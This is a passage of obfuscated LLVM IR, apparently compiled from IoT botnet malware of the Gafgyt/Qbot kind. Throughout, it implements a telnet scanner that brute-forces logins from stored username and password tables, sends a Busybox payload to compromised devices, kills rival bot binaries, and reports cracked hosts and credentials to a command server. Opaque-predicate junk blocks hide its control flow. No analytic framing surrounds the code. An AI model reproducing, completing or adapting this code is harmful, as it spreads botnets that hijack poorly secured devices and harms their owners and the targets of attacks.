  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 0
  %1013 = load i32, i32* %1012, align 16
  %1014 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1015 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1016 = call i64 @strlen(i8* %1015) #9
  %1017 = call i64 @send(i32 %1013, i8* %1014, i64 %1016, i32 16384)
  %1018 = icmp slt i64 %1017, 0
  %1019 = load i32, i32* @x.71
  %1020 = load i32, i32* @y.72
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1018, label %1027, label %1047

; <label>:1027:                                   ; preds = %originalBBpart2140
  %1028 = load i32, i32* @x.71
  %1029 = load i32, i32* @y.72
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1027
  %1036 = load i32, i32* %6, align 4
  %1037 = sext i32 %1036 to i64
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1037
  call void @reset_telstate(%struct.telstate_t* %1038)
  %1039 = load i32, i32* @x.71
  %1040 = load i32, i32* @y.72
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1394

; <label>:1047:                                   ; preds = %originalBBpart2140
  %1048 = load i32, i32* @x.71
  %1049 = load i32, i32* @y.72
  %1050 = sub i32 %1048, 1
  %1051 = mul i32 %1048, %1050
  %1052 = urem i32 %1051, 2
  %1053 = icmp eq i32 %1052, 0
  %1054 = icmp slt i32 %1049, 10
  %1055 = or i1 %1053, %1054
  br i1 %1055, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1047
  call void @RemoveTempDirs()
  %1056 = load i32, i32* @mainCommSock, align 4
  %1057 = load i32, i32* %6, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1058
  %1060 = call i8* @get_telstate_host(%struct.telstate_t* %1059)
  %1061 = load i32, i32* %6, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 4
  %1065 = load i8, i8* %1064, align 2
  %1066 = zext i8 %1065 to i64
  %1067 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1066
  %1068 = load i8*, i8** %1067, align 8
  %1069 = load i32, i32* %6, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 5
  %1073 = load i8, i8* %1072, align 1
  %1074 = zext i8 %1073 to i64
  %1075 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1074
  %1076 = load i8*, i8** %1075, align 8
  %1077 = call i32 (i32, i8*, ...) @sockprintf(i32 %1056, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %1060, i8* %1068, i8* %1076)
  %1078 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1079 = call i32 (i8*, i8*, ...) @sprintf(i8* %1078, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1080 = load i32, i32* %6, align 4
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 0
  %1084 = load i32, i32* %1083, align 16
  %1085 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1086 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1087 = call i64 @strlen(i8* %1086) #9
  %1088 = call i64 @send(i32 %1084, i8* %1085, i64 %1087, i32 16384)
  %1089 = icmp slt i64 %1088, 0
  %1090 = load i32, i32* @x.71
  %1091 = load i32, i32* @y.72
  %1092 = sub i32 %1090, 1
  %1093 = mul i32 %1090, %1092
  %1094 = urem i32 %1093, 2
  %1095 = icmp eq i32 %1094, 0
  %1096 = icmp slt i32 %1091, 10
  %1097 = or i1 %1095, %1096
  br i1 %1097, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1089, label %1098, label %1102

; <label>:1098:                                   ; preds = %originalBBpart2148
  %1099 = load i32, i32* %6, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1100
  call void @reset_telstate(%struct.telstate_t* %1101)
  br label %1394

; <label>:1102:                                   ; preds = %originalBBpart2148
  %1103 = load i32, i32* @x.71
  %1104 = load i32, i32* @y.72
  %1105 = sub i32 %1103, 1
  %1106 = mul i32 %1103, %1105
  %1107 = urem i32 %1106, 2
  %1108 = icmp eq i32 %1107, 0
  %1109 = icmp slt i32 %1104, 10
  %1110 = or i1 %1108, %1109
  br i1 %1110, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1102
  %1111 = load i32, i32* @mainCommSock, align 4
  %1112 = load i32, i32* %6, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1113
  %1115 = call i8* @get_telstate_host(%struct.telstate_t* %1114)
  %1116 = load i32, i32* %6, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 4
  %1120 = load i8, i8* %1119, align 2
  %1121 = zext i8 %1120 to i64
  %1122 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1121
  %1123 = load i8*, i8** %1122, align 8
  %1124 = load i32, i32* %6, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1125
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1126, i32 0, i32 5
  %1128 = load i8, i8* %1127, align 1
  %1129 = zext i8 %1128 to i64
  %1130 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1129
  %1131 = load i8*, i8** %1130, align 8
  %1132 = call i32 (i32, i8*, ...) @sockprintf(i32 %1111, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %1115, i8* %1123, i8* %1131)
  %1133 = load i32, i32* %6, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1134
  call void @advance_telstate(%struct.telstate_t* %1135, i32 8)
  %1136 = load i32, i32* @x.71
  %1137 = load i32, i32* @y.72
  %1138 = sub i32 %1136, 1
  %1139 = mul i32 %1136, %1138
  %1140 = urem i32 %1139, 2
  %1141 = icmp eq i32 %1140, 0
  %1142 = icmp slt i32 %1137, 10
  %1143 = or i1 %1141, %1142
  br i1 %1143, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1377

; <label>:1144:                                   ; preds = %154
  %1145 = load i32, i32* @x.71
  %1146 = load i32, i32* @y.72
  %1147 = sub i32 %1145, 1
  %1148 = mul i32 %1145, %1147
  %1149 = urem i32 %1148, 2
  %1150 = icmp eq i32 %1149, 0
  %1151 = icmp slt i32 %1146, 10
  %1152 = or i1 %1150, %1151
  br i1 %1152, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1144
  %1153 = call i64 @time(i64* null) #5
  %1154 = trunc i64 %1153 to i32
  %1155 = load i32, i32* %6, align 4
  %1156 = sext i32 %1155 to i64
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1156
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1157, i32 0, i32 7
  store i32 %1154, i32* %1158, align 16
  %1159 = load i32, i32* %6, align 4
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1160
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1161, i32 0, i32 0
  %1163 = load i32, i32* %1162, align 16
  %1164 = call i64 @send(i32 %1163, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %1165 = icmp slt i64 %1164, 0
  %1166 = load i32, i32* @x.71
  %1167 = load i32, i32* @y.72
  %1168 = sub i32 %1166, 1
  %1169 = mul i32 %1166, %1168
  %1170 = urem i32 %1169, 2
  %1171 = icmp eq i32 %1170, 0
  %1172 = icmp slt i32 %1167, 10
  %1173 = or i1 %1171, %1172
  br i1 %1173, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1165, label %1174, label %1175

; <label>:1174:                                   ; preds = %originalBBpart2156
  br label %1175

; <label>:1175:                                   ; preds = %1174, %originalBBpart2156
  %1176 = load i32, i32* %6, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1177
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1178, i32 0, i32 0
  %1180 = load i32, i32* %1179, align 16
  %1181 = call i64 @send(i32 %1180, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i32 0, i32 0), i64 7, i32 16384)
  %1182 = icmp slt i64 %1181, 0
  br i1 %1182, label %1183, label %1200

; <label>:1183:                                   ; preds = %1175
  %1184 = load i32, i32* @x.71
  %1185 = load i32, i32* @y.72
  %1186 = sub i32 %1184, 1
  %1187 = mul i32 %1184, %1186
  %1188 = urem i32 %1187, 2
  %1189 = icmp eq i32 %1188, 0
  %1190 = icmp slt i32 %1185, 10
  %1191 = or i1 %1189, %1190
  br i1 %1191, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1183
  %1192 = load i32, i32* @x.71
  %1193 = load i32, i32* @y.72
  %1194 = sub i32 %1192, 1
  %1195 = mul i32 %1192, %1194
  %1196 = urem i32 %1195, 2
  %1197 = icmp eq i32 %1196, 0
  %1198 = icmp slt i32 %1193, 10
  %1199 = or i1 %1197, %1198
  br i1 %1199, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1200

; <label>:1200:                                   ; preds = %originalBBpart2160, %1175
  %1201 = load i32, i32* %6, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1203, i32 0, i32 0
  %1205 = load i32, i32* %1204, align 16
  %1206 = load i8*, i8** @Busybox_Payload, align 8
  %1207 = load i8*, i8** @Busybox_Payload, align 8
  %1208 = call i64 @strlen(i8* %1207) #9
  %1209 = call i64 @send(i32 %1205, i8* %1206, i64 %1208, i32 16384)
  %1210 = icmp slt i64 %1209, 0
  br i1 %1210, label %1211, label %1215

; <label>:1211:                                   ; preds = %1200
  %1212 = load i32, i32* %6, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1213
  call void @reset_telstate(%struct.telstate_t* %1214)
  br label %1394

; <label>:1215:                                   ; preds = %1200
  %1216 = load i32, i32* @mainCommSock, align 4
  %1217 = load i32, i32* %6, align 4
  %1218 = sext i32 %1217 to i64
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1218
  %1220 = call i8* @get_telstate_host(%struct.telstate_t* %1219)
  %1221 = load i32, i32* %6, align 4
  %1222 = sext i32 %1221 to i64
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1222
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1223, i32 0, i32 4
  %1225 = load i8, i8* %1224, align 2
  %1226 = zext i8 %1225 to i64
  %1227 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1226
  %1228 = load i8*, i8** %1227, align 8
  %1229 = load i32, i32* %6, align 4
  %1230 = sext i32 %1229 to i64
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 5
  %1233 = load i8, i8* %1232, align 1
  %1234 = zext i8 %1233 to i64
  %1235 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1234
  %1236 = load i8*, i8** %1235, align 8
  %1237 = call i32 (i32, i8*, ...) @sockprintf(i32 %1216, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i32 0, i32 0), i8* %1220, i8* %1228, i8* %1236)
  %1238 = load i32, i32* %6, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 0
  %1242 = load i32, i32* %1241, align 16
  %1243 = load i32, i32* %3, align 4
  %1244 = load i32, i32* %6, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 9
  %1248 = load i8*, i8** %1247, align 8
  %1249 = call i32 @read_until_response(i32 %1242, i32 %1243, i8* %1248, i32 1024, i8** bitcast ([7 x i8]* @.str.510 to i8**))
  %1250 = icmp ne i32 %1249, 0
  br i1 %1250, label %1251, label %1331

; <label>:1251:                                   ; preds = %1215
  %1252 = load i32, i32* @x.71
  %1253 = load i32, i32* @y.72
  %1254 = sub i32 %1252, 1
  %1255 = mul i32 %1252, %1254
  %1256 = urem i32 %1255, 2
  %1257 = icmp eq i32 %1256, 0
  %1258 = icmp slt i32 %1253, 10
  %1259 = or i1 %1257, %1258
  br i1 %1259, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1251
  %1260 = load i32, i32* %6, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 9
  %1264 = load i8*, i8** %1263, align 8
  %1265 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1264, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %1266 = icmp ne i32 %1265, 0
  %1267 = load i32, i32* @x.71
  %1268 = load i32, i32* @y.72
  %1269 = sub i32 %1267, 1
  %1270 = mul i32 %1267, %1269
  %1271 = urem i32 %1270, 2
  %1272 = icmp eq i32 %1271, 0
  %1273 = icmp slt i32 %1268, 10
  %1274 = or i1 %1272, %1273
  br i1 %1274, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1266, label %1275, label %1330

; <label>:1275:                                   ; preds = %originalBBpart2164
  %1276 = load i32, i32* %6, align 4
  %1277 = sext i32 %1276 to i64
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1277
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1278, i32 0, i32 3
  %1280 = load i8, i8* %1279, align 1
  %1281 = zext i8 %1280 to i32
  %1282 = icmp ne i32 %1281, 3
  br i1 %1282, label %1283, label %1330

; <label>:1283:                                   ; preds = %1275
  %1284 = load i32, i32* @x.71
  %1285 = load i32, i32* @y.72
  %1286 = sub i32 %1284, 1
  %1287 = mul i32 %1284, %1286
  %1288 = urem i32 %1287, 2
  %1289 = icmp eq i32 %1288, 0
  %1290 = icmp slt i32 %1285, 10
  %1291 = or i1 %1289, %1290
  br i1 %1291, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1283
  %1292 = load i32, i32* @mainCommSock, align 4
  %1293 = load i32, i32* %6, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 1
  %1297 = bitcast i32* %1296 to %struct.in_addr*
  %1298 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1297, i32 0, i32 0
  %1299 = load i32, i32* %1298, align 4
  %1300 = call i8* @inet_ntoa(i32 %1299) #5
  %1301 = load i32, i32* %6, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 4
  %1305 = load i8, i8* %1304, align 2
  %1306 = zext i8 %1305 to i64
  %1307 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1306
  %1308 = load i8*, i8** %1307, align 8
  %1309 = load i32, i32* %6, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1310
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1311, i32 0, i32 5
  %1313 = load i8, i8* %1312, align 1
  %1314 = zext i8 %1313 to i64
  %1315 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1314
  %1316 = load i8*, i8** %1315, align 8
  %1317 = call i32 (i32, i8*, ...) @sockprintf(i32 %1292, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %1300, i8* %1308, i8* %1316)
  %1318 = load i32, i32* %6, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 3
  store i8 3, i8* %1321, align 1
  %1322 = load i32, i32* @x.71
  %1323 = load i32, i32* @y.72
  %1324 = sub i32 %1322, 1
  %1325 = mul i32 %1322, %1324
  %1326 = urem i32 %1325, 2
  %1327 = icmp eq i32 %1326, 0
  %1328 = icmp slt i32 %1323, 10
  %1329 = or i1 %1327, %1328
  br i1 %1329, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1330

; <label>:1330:                                   ; preds = %originalBBpart2168, %1275, %originalBBpart2164
  br label %1331

; <label>:1331:                                   ; preds = %1330, %1215
  %1332 = load i32, i32* %6, align 4
  %1333 = sext i32 %1332 to i64
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1333
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1334, i32 0, i32 7
  %1336 = load i32, i32* %1335, align 16
  %1337 = add i32 %1336, 10
  %1338 = zext i32 %1337 to i64
  %1339 = call i64 @time(i64* null) #5
  %1340 = icmp slt i64 %1338, %1339
  br i1 %1340, label %1341, label %1376

; <label>:1341:                                   ; preds = %1331
  %1342 = load i32, i32* %6, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1343
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1344, i32 0, i32 3
  %1346 = load i8, i8* %1345, align 1
  %1347 = zext i8 %1346 to i32
  %1348 = icmp ne i32 %1347, 3
  br i1 %1348, label %1349, label %1372

; <label>:1349:                                   ; preds = %1341
  %1350 = load i32, i32* @mainCommSock, align 4
  %1351 = load i32, i32* %6, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1352
  %1354 = call i8* @get_telstate_host(%struct.telstate_t* %1353)
  %1355 = load i32, i32* %6, align 4
  %1356 = sext i32 %1355 to i64
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1356
  %1358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1357, i32 0, i32 4
  %1359 = load i8, i8* %1358, align 2
  %1360 = zext i8 %1359 to i64
  %1361 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1360
  %1362 = load i8*, i8** %1361, align 8
  %1363 = load i32, i32* %6, align 4
  %1364 = sext i32 %1363 to i64
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1364
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1365, i32 0, i32 5
  %1367 = load i8, i8* %1366, align 1
  %1368 = zext i8 %1367 to i64
  %1369 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1368
  %1370 = load i8*, i8** %1369, align 8
  %1371 = call i32 (i32, i8*, ...) @sockprintf(i32 %1350, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i32 0, i32 0), i8* %1354, i8* %1362, i8* %1370)
  br label %1372

; <label>:1372:                                   ; preds = %1349, %1341
  %1373 = load i32, i32* %6, align 4
  %1374 = sext i32 %1373 to i64
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1374
  call void @reset_telstate(%struct.telstate_t* %1375)
  br label %1376

; <label>:1376:                                   ; preds = %1372, %1331
  br label %1377

; <label>:1377:                                   ; preds = %1376, %originalBBpart2152, %997, %798, %724, %653, %579, %495, %328, %154
  %1378 = load i32, i32* @x.71
  %1379 = load i32, i32* @y.72
  %1380 = sub i32 %1378, 1
  %1381 = mul i32 %1378, %1380
  %1382 = urem i32 %1381, 2
  %1383 = icmp eq i32 %1382, 0
  %1384 = icmp slt i32 %1379, 10
  %1385 = or i1 %1383, %1384
  br i1 %1385, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1377
  %1386 = load i32, i32* @x.71
  %1387 = load i32, i32* @y.72
  %1388 = sub i32 %1386, 1
  %1389 = mul i32 %1386, %1388
  %1390 = urem i32 %1389, 2
  %1391 = icmp eq i32 %1390, 0
  %1392 = icmp slt i32 %1387, 10
  %1393 = or i1 %1391, %1392
  br i1 %1393, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1394

; <label>:1394:                                   ; preds = %originalBBpart2172, %1211, %1098, %originalBBpart2144, %966, %originalBBpart2109, %originalBBpart2105, %693, %originalBBpart297, %605, %originalBBpart289, %476, %456, %293, %230, %217
  %1395 = load i32, i32* @x.71
  %1396 = load i32, i32* @y.72
  %1397 = sub i32 %1395, 1
  %1398 = mul i32 %1395, %1397
  %1399 = urem i32 %1398, 2
  %1400 = icmp eq i32 %1399, 0
  %1401 = icmp slt i32 %1396, 10
  %1402 = or i1 %1400, %1401
  br i1 %1402, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1394
  %1403 = load i32, i32* %6, align 4
  %1404 = add nsw i32 %1403, 1
  store i32 %1404, i32* %6, align 4
  %1405 = load i32, i32* @x.71
  %1406 = load i32, i32* @y.72
  %1407 = sub i32 %1405, 1
  %1408 = mul i32 %1405, %1407
  %1409 = urem i32 %1408, 2
  %1410 = icmp eq i32 %1409, 0
  %1411 = icmp slt i32 %1406, 10
  %1412 = or i1 %1410, %1411
  br i1 %1412, label %originalBBpart2186, label %originalBB174alteredBB

originalBBpart2186:                               ; preds = %originalBB174
  br label %120

; <label>:1413:                                   ; preds = %120
  br label %102
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %52
  %1415 = load i32, i32* %6, align 4
  %1416 = sext i32 %1415 to i64
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1416
  %1418 = bitcast %struct.telstate_t* %1417 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1418, i8 0, i64 32, i32 16, i1 false)
  %1419 = load i32, i32* %6, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 3
  store i8 1, i8* %1422, align 1
  %1423 = load i8*, i8** %17, align 8
  %1424 = load i32, i32* %6, align 4
  %1425 = sext i32 %1424 to i64
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1425
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1426, i32 0, i32 9
  store i8* %1423, i8** %1427, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %82
  %1428 = load i32, i32* %6, align 4
  %_ = sub i32 0, %1428
  %gen = add i32 %_, 1
  %_2 = shl i32 %1428, 1
  %1429 = add nsw i32 %1428, 1
  store i32 %1429, i32* %6, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %102
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %131
  %1430 = call i64 @time(i64* null) #5
  %1431 = trunc i64 %1430 to i32
  %1432 = load i32, i32* %6, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1433
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1434, i32 0, i32 7
  store i32 %1431, i32* %1435, align 16
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %235
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %252
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %339
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %356
  %1436 = load i32, i32* %6, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 0
  %1440 = load i32, i32* %1439, align 16
  %_27 = shl i32 %1440, 64
  %_28 = shl i32 %1440, 64
  %_29 = sub i32 0, %1440
  %gen30 = add i32 %_29, 64
  %_31 = shl i32 %1440, 64
  %_32 = shl i32 %1440, 64
  %_33 = sub i32 %1440, 64
  %gen34 = mul i32 %_33, 64
  %_35 = shl i32 %1440, 64
  %_36 = sub i32 0, %1440
  %gen37 = add i32 %_36, 64
  %1441 = srem i32 %1440, 64
  %1442 = zext i32 %1441 to i64
  %_38 = sub i64 0, 1
  %gen39 = add i64 %_38, %1442
  %_40 = sub i64 0, 1
  %gen41 = add i64 %_40, %1442
  %_42 = sub i64 1, %1442
  %gen43 = mul i64 %_42, %1442
  %_44 = sub i64 1, %1442
  %gen45 = mul i64 %_44, %1442
  %_46 = sub i64 1, %1442
  %gen47 = mul i64 %_46, %1442
  %_48 = shl i64 1, %1442
  %_49 = sub i64 0, 1
  %gen50 = add i64 %_49, %1442
  %1443 = shl i64 1, %1442
  %1444 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %1445 = load i32, i32* %6, align 4
  %1446 = sext i32 %1445 to i64
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1446
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1447, i32 0, i32 0
  %1449 = load i32, i32* %1448, align 16
  %_51 = shl i32 %1449, 64
  %_52 = shl i32 %1449, 64
  %_53 = shl i32 %1449, 64
  %_54 = shl i32 %1449, 64
  %1450 = sdiv i32 %1449, 64
  %1451 = sext i32 %1450 to i64
  %1452 = getelementptr inbounds [16 x i64], [16 x i64]* %1444, i64 0, i64 %1451
  %1453 = load i64, i64* %1452, align 8
  %_55 = sub i64 0, %1453
  %gen56 = add i64 %_55, %1443
  %_57 = sub i64 %1453, %1443
  %gen58 = mul i64 %_57, %1443
  %1454 = or i64 %1453, %1443
  store i64 %1454, i64* %1452, align 8
